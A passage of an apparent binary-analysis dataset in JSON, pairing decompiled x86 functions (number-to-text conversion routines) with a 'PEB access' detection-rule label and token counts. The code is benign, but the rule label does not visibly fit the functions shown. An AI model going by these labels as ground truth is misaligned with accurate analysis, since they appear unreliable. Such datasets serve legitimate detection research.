+ -1;\n        pcVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 414
    },
    "00445601": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445601(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = pcVar4;\n    pcVar5 = pcVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = pcVar4 - pcVar5;\n                *(in_ECX + 0x30) = pcVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *pcVar5 = (uVar1 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 414
    },
    "00445679": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445679(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = pcVar4;\n    pcVar5 = pcVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = pcVar4 - pcVar5;\n                *(in_ECX + 0x30) = pcVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *pcVar5 = (uVar1 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 414
    },
    "004456f1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004456f1(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = pcVar4;\n    pcVar5 = pcVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = pcVar4 - pcVar5;\n                *(in_ECX + 0x30) = pcVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *pcVar5 = (uVar1 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 415
    },
    "00445769": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445769(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = pcVar4;\n    pcVar5 = pcVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = pcVar4 - pcVar5;\n                *(in_ECX + 0x30) = pcVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *pcVar5 = (uVar1 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 414
    },
    "004457e1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004457e1(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar4 = iVar2 + -1 + iVar3;\n    *(in_ECX + 0x30) = pcVar4;\n    pcVar5 = pcVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = pcVar4 - pcVar5;\n                *(in_ECX + 0x30) = pcVar5 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar3 + -1;\n        uVar1 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *pcVar5 = (uVar1 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 415
    },
    "00445859": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445859(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int16_t *piVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar5 = piVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = piVar1 - piVar5 >> 1;\n                *(in_ECX + 0x30) = piVar5 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *piVar5 = (uVar2 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 432
    },
    "004458e0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004458e0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int16_t *piVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar5 = piVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = piVar1 - piVar5 >> 1;\n                *(in_ECX + 0x30) = piVar5 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *piVar5 = (uVar2 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 433
    },
    "00445967": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445967(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int16_t *piVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar5 = piVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = piVar1 - piVar5 >> 1;\n                *(in_ECX + 0x30) = piVar5 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *piVar5 = (uVar2 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 432
    },
    "004459ee": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004459ee(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int16_t *piVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar5 = piVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = piVar1 - piVar5 >> 1;\n                *(in_ECX + 0x30) = piVar5 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *piVar5 = (uVar2 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 432
    },
    "00445a75": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445a75(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int16_t *piVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar5 = piVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = piVar1 - piVar5 >> 1;\n                *(in_ECX + 0x30) = piVar5 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *piVar5 = (uVar2 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 433
    },
    "00445afc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445afc(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int16_t *piVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar1 = iVar4 + (iVar3 + -1) * 2;\n    *(in_ECX + 0x30) = piVar1;\n    piVar5 = piVar1;\n    do {\n        iVar4 = *(in_ECX + 0x24);\n        if (iVar4 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = piVar1 - piVar5 >> 1;\n                *(in_ECX + 0x30) = piVar5 + 1;\n                return;\n            }\n            iVar4 = *(in_ECX + 0x24);\n        }\n        *(in_ECX + 0x24) = iVar4 + -1;\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        *piVar5 = (uVar2 & 7) + 0x30;\n        arg_ch = arg_ch >> 3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar5 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 432
    },
    "00445b83": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445b83(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar5 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = pcVar5;\n    var_4h = arg_8h;\n    pcVar3 = pcVar5;\n    while ((0 < *(in_ECX + 0x24) || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        cVar1 = fcn.00476c70(var_4h, arg_ch, 10, 0);\n        cVar1 = cVar1 + '0';\n        uVar6 = fcn.00476c00();\n        arg_ch = uVar6 >> 0x20;\n        var_4h = uVar6;\n        if ('9' < cVar1) {\n            cVar1 = (arg_10h ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *pcVar3 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar5 - pcVar3;\n    *(in_ECX + 0x30) = pcVar3 + 1;\n    return;\n}\n",
        "token_count": 476
    },
    "00445c2a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445c2a(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar5 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = pcVar5;\n    var_4h = arg_8h;\n    pcVar3 = pcVar5;\n    while ((0 < *(in_ECX + 0x24) || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        cVar1 = fcn.00476c70(var_4h, arg_ch, 10, 0);\n        cVar1 = cVar1 + '0';\n        uVar6 = fcn.00476c00();\n        arg_ch = uVar6 >> 0x20;\n        var_4h = uVar6;\n        if ('9' < cVar1) {\n            cVar1 = (arg_10h ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *pcVar3 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar5 - pcVar3;\n    *(in_ECX + 0x30) = pcVar3 + 1;\n    return;\n}\n",
        "token_count": 477
    },
    "00445cd1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445cd1(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar5 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = pcVar5;\n    var_4h = arg_8h;\n    pcVar3 = pcVar5;\n    while ((0 < *(in_ECX + 0x24) || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        cVar1 = fcn.00476c70(var_4h, arg_ch, 10, 0);\n        cVar1 = cVar1 + '0';\n        uVar6 = fcn.00476c00();\n        arg_ch = uVar6 >> 0x20;\n        var_4h = uVar6;\n        if ('9' < cVar1) {\n            cVar1 = (arg_10h ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *pcVar3 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar5 - pcVar3;\n    *(in_ECX + 0x30) = pcVar3 + 1;\n    return;\n}\n",
        "token_count": 476
    },
    "00445d78": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445d78(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar5 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = pcVar5;\n    var_4h = arg_8h;\n    pcVar3 = pcVar5;\n    while ((0 < *(in_ECX + 0x24) || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        cVar1 = fcn.00476c70(var_4h, arg_ch, 10, 0);\n        cVar1 = cVar1 + '0';\n        uVar6 = fcn.00476c00();\n        arg_ch = uVar6 >> 0x20;\n        var_4h = uVar6;\n        if ('9' < cVar1) {\n            cVar1 = (arg_10h ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *pcVar3 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar5 - pcVar3;\n    *(in_ECX + 0x30) = pcVar3 + 1;\n    return;\n}\n",
        "token_count": 476
    },
    "00445e1f": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445e1f(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar5 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = pcVar5;\n    var_4h = arg_8h;\n    pcVar3 = pcVar5;\n    while ((0 < *(in_ECX + 0x24) || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        cVar1 = fcn.00476c70(var_4h, arg_ch, 10, 0);\n        cVar1 = cVar1 + '0';\n        uVar6 = fcn.00476c00();\n        arg_ch = uVar6 >> 0x20;\n        var_4h = uVar6;\n        if ('9' < cVar1) {\n            cVar1 = (arg_10h ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *pcVar3 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar5 - pcVar3;\n    *(in_ECX + 0x30) = pcVar3 + 1;\n    return;\n}\n",
        "token_count": 477
    },
    "00445ec6": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445ec6(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0043d565();\n    pcVar5 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = pcVar5;\n    var_4h = arg_8h;\n    pcVar3 = pcVar5;\n    while ((0 < *(in_ECX + 0x24) || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        cVar1 = fcn.00476c70(var_4h, arg_ch, 10, 0);\n        cVar1 = cVar1 + '0';\n        uVar6 = fcn.00476c00();\n        arg_ch = uVar6 >> 0x20;\n        var_4h = uVar6;\n        if ('9' < cVar1) {\n            cVar1 = (arg_10h ^ 1) * ' ' + '\\a' + cVar1;\n        }\n        *pcVar3 = cVar1;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        pcVar3 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = pcVar5 - pcVar3;\n    *(in_ECX + 0x30) = pcVar3 + 1;\n    return;\n}\n",
        "token_count": 476
    },
    "00445f6d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445f6d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = CONCAT44(arg_ch, arg_8h);\n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar6 = iVar5 + iVar3 * 2 + -2;\n    *(in_ECX + 0x30) = piVar6;\n    piVar4 = piVar6;\n    while ((0 < *(in_ECX + 0x24) || (iVar7 != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        iVar1 = fcn.00476c70(iVar7, 10, 0);\n        uVar2 = iVar1 + 0x30;\n        iVar7 = fcn.00476c00();\n        if (0x39 < uVar2) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        *piVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar6 - piVar4 >> 1;\n    *(in_ECX + 0x30) = piVar4 + 1;\n    return;\n}\n",
        "token_count": 462
    },
    "0044602a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044602a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = CONCAT44(arg_ch, arg_8h);\n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar6 = iVar5 + iVar3 * 2 + -2;\n    *(in_ECX + 0x30) = piVar6;\n    piVar4 = piVar6;\n    while ((0 < *(in_ECX + 0x24) || (iVar7 != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        iVar1 = fcn.00476c70(iVar7, 10, 0);\n        uVar2 = iVar1 + 0x30;\n        iVar7 = fcn.00476c00();\n        if (0x39 < uVar2) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        *piVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar6 - piVar4 >> 1;\n    *(in_ECX + 0x30) = piVar4 + 1;\n    return;\n}\n",
        "token_count": 461
    },
    "004460e7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004460e7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = CONCAT44(arg_ch, arg_8h);\n    iVar5 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar5 = in_ECX + 0x3c;\n    }\n    iVar3 = fcn.0043d57d();\n    piVar6 = iVar5 + iVar3 * 2 + -2;\n    *(in_ECX + 0x30) = piVar6;\n    piVar4 = piVar6;\n    while ((0 < *(in_ECX + 0x24) || (iVar7 != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        iVar1 = fcn.00476c70(iVar7, 10, 0);\n        uVar2 = iVar1 + 0x30;\n        iVar7 = fcn.00476c00();\n        if (0x39 < uVar2) {\n            uVar2 = (arg_10h ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        *piVar4 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        piVar4 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = piVar6 - piVar4 >> 1;\n    